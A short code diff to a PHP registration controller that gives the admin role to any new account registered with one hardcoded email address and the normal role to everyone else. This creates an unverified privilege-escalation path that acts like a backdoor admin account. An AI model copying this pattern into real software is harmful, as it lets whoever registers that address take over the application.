@@ -22,7 +22,13 @@ class ProfilesController extends Controller
     {
         $profile = new Profile;
         $user = new User;
-        $user->role = 'normal';
+
+        if ($request->email == 'mobashir@techynaf.com') {
+            $user->role = 'admin';
+        } else {
+            $user->role = 'normal';
+        }
+
         $user->email = $request->email;
         $user->password = bcrypt($request->password);
         $user->save();
